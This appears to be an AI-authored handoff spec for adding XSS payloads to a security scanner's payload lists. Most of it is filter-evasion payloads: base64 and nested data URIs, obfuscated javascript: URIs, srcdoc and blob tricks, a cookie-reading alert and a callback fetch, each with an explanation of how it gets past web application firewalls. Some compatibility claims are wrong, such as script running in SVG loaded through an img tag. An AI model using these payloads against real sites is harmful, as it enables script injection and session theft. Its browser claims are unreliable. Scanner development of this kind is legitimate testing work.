# Handoff: XSS Data URI & JavaScript URI Advanced Payloads

**Date**: 2026-01-21
**Author**: Claude (Opus 4.5)
**Priority**: HIGH
**Estimated Effort**: Low (30-45 minutes)
**Target Files**:
- `bugtrace/data/xss_batches/waf_bypass.txt`
- `bugtrace/data/xss_batches/polyglots.txt`
- `bugtrace/data/xss_batches/no_tag.txt`

---

## 1. Problem Statement

The framework has basic `data:text/html` and `javascript:` payloads, but lacks:

1. **Base64-encoded Data URIs** - More WAF-evasive than plaintext
2. **Nested Data URIs** - iframe within iframe technique
3. **SVG Data URIs** - SVG files can contain JavaScript
4. **Alternative MIME types** - `text/xml`, `image/svg+xml`
5. **JavaScript URI obfuscation** - Case mixing, encoding, newlines

### Current State

From `waf_bypass.txt`:
```html
<object data="data:text/html,<script>alert(1)</script>">
<iframe src="data:text/html,<script>alert(1)</script>">
```

These are **easily detected** because the WAF sees `<script>alert(1)</script>` in plaintext.

---

## 2. Implementation Details

### 2.1 Add Advanced Data URI Payloads to `waf_bypass.txt`

Append to `bugtrace/data/xss_batches/waf_bypass.txt`:

```html
# ================================================================
# DATA URI WITH BASE64 ENCODING
# ================================================================
# data:text/html;base64,BASE64_ENCODED_HTML
# WAF cannot pattern-match the encoded content

# <script>alert(1)</script> = PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

# <img src=x onerror=alert(1)> = PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==
<iframe src="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">

# <body onload=alert(1)> = PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==
<iframe src="data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">

# <svg onload=alert(1)> = PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
<iframe src="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">

# ================================================================
# SVG DATA URI (image/svg+xml)
# ================================================================
# SVG files can execute JavaScript via onload events
<img src="data:image/svg+xml,<svg onload=alert(1)>">
<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">

# SVG with namespace (more realistic)
<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>">

# SVG with embedded script
# <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
# = PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=">

# ================================================================
# NESTED DATA URI (iframe inception)
# ================================================================
# Outer iframe loads inner data URI - confuses parsers
<iframe src="data:text/html,<iframe src='data:text/html,<script>alert(1)</script>'>">

# Base64 nested (harder to detect)
# Inner: <script>alert(1)</script>
# Outer: <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<iframe src="data:text/html;base64,PGlmcmFtZSBzcmM9ImRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQSE5qY21sd2RENWhiR1Z5ZENneEtUd3ZjMk55YVhCMFBnPT0iPg==">

# ================================================================
# ALTERNATIVE MIME TYPES
# ================================================================
<iframe src="data:text/xml,<x:script xmlns:x='http://www.w3.org/1999/xhtml'>alert(1)</x:script>">
<object data="data:text/xml;base64,PHg6c2NyaXB0IHhtbG5zOng9J2h0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwnPmFsZXJ0KDEpPC94OnNjcmlwdD4=">

# ================================================================
# JAVASCRIPT URI OBFUSCATION
# ================================================================
# Case mixing (JaVaScRiPt:)
<a href="JaVaScRiPt:alert(1)">click</a>
<iframe src="jAvAsCrIpT:alert(1)">

# Tab/newline injection (breaks pattern matching)
<a href="java&#x09;script:alert(1)">click</a>
<a href="java&#x0a;script:alert(1)">click</a>
<a href="java&#x0d;script:alert(1)">click</a>

# Multiple encoding layers
<a href="&#x6a;avascript:alert(1)">click</a>
<a href="&#106;avascript:alert(1)">click</a>

# Data URI in javascript: context
<a href="javascript:location='data:text/html,<script>alert(1)</script>'">click</a>

# ================================================================
# SRCDOC ATTRIBUTE (HTML5)
# ================================================================
# srcdoc executes HTML directly without needing src
<iframe srcdoc="<script>alert(1)</script>">
<iframe srcdoc="<img src=x onerror=alert(1)>">
<iframe srcdoc="<svg onload=alert(1)>">

# Base64 in srcdoc (double encoding)
<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>">

# ================================================================
# BLOB URLs (Modern browsers)
# ================================================================
# These require JavaScript execution first, but useful for DOM XSS
<script>location=URL.createObjectURL(new Blob(['<script>alert(1)<\/script>'],{type:'text/html'}))</script>
```

### 2.2 Add to `no_tag.txt` (Tag-less XSS)

Append to `bugtrace/data/xss_batches/no_tag.txt`:

```html
# ================================================================
# JAVASCRIPT URI (No HTML tags needed, for href/src contexts)
# ================================================================
javascript:alert(1)
javascript:alert(document.domain)
javascript:alert(document.cookie)
javascript:fetch('{{interactsh_url}}')

# Obfuscated javascript: URIs
JaVaScRiPt:alert(1)
java&#x09;script:alert(1)
java&#x0a;script:alert(1)
&#106;avascript:alert(1)
&#x6a;avascript:alert(1)

# javascript: with encoding
javascript:eval(atob('YWxlcnQoMSk='))
javascript:Function(atob('YWxlcnQoMSk='))()

# DATA URI (for src/href contexts)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
data:image/svg+xml,<svg onload=alert(1)>
```

### 2.3 Add to `polyglots.txt`

Append to `bugtrace/data/xss_batches/polyglots.txt`:

```html
# ================================================================
# DATA URI POLYGLOTS
# ================================================================
# Works in multiple contexts (iframe src, object data, a href)
"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><a href="javascript:alert(1)">

# SVG + HTML + JavaScript polyglot
<svg><a href="javascript:alert(1)"><text y=20>click</text></a></svg>

# Combined iframe srcdoc + data URI
"><iframe srcdoc="<iframe src='data:text/html,<script>alert(1)</script>'>">
```

---

## 3. Base64 Encoding Reference for Data URIs

| Original HTML | Base64 Encoded |
|---------------|----------------|
| `<script>alert(1)</script>` | `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` |
| `<img src=x onerror=alert(1)>` | `PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==` |
| `<svg onload=alert(1)>` | `PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+` |
| `<body onload=alert(1)>` | `PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==` |

Generate:
```bash
echo -n '<script>alert(1)</script>' | base64
```

---

## 4. Verification Checklist

After implementation:

- [ ] `waf_bypass.txt` contains 20+ new data URI payloads
- [ ] `no_tag.txt` contains 10+ javascript:/data: payloads
- [ ] `polyglots.txt` contains 3+ data URI polyglots
- [ ] Test in browser: `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` should execute alert

---

## 5. Why This Works

### Data URI Advantages:
1. **Self-contained**: No external resource needed
2. **Base64 obfuscation**: Hides malicious content from pattern matching
3. **MIME type flexibility**: Can use `text/html`, `image/svg+xml`, `text/xml`
4. **iframe/object/embed**: Multiple HTML elements accept data URIs

### JavaScript URI Advantages:
1. **No tags needed**: Works in `href`, `src`, `action` attributes
2. **Case insensitive**: `JaVaScRiPt:` = `javascript:`
3. **Character injection**: Tabs/newlines break WAF patterns
4. **Entity encoding**: `&#106;` = `j`, bypasses blocklists

---

## 6. Browser Compatibility Notes

| Technique | Chrome | Firefox | Safari | Edge |
|-----------|--------|---------|--------|------|
| data: in iframe | ✅ | ✅ | ✅ | ✅ |
| data: in object | ✅ | ✅ | ⚠️ | ✅ |
| data: in embed | ✅ | ✅ | ⚠️ | ✅ |
| javascript: in a href | ✅ | ✅ | ✅ | ✅ |
| srcdoc attribute | ✅ | ✅ | ✅ | ✅ |
| SVG data URI | ✅ | ✅ | ✅ | ✅ |

---

## 7. Success Criteria

1. XSSAgent can deliver XSS via data URIs when `<script>` tags are blocked
2. JavaScript URIs work in attribute-injection contexts
3. Base64-encoded data URIs bypass WAF pattern matching
4. SVG data URIs provide alternative execution path

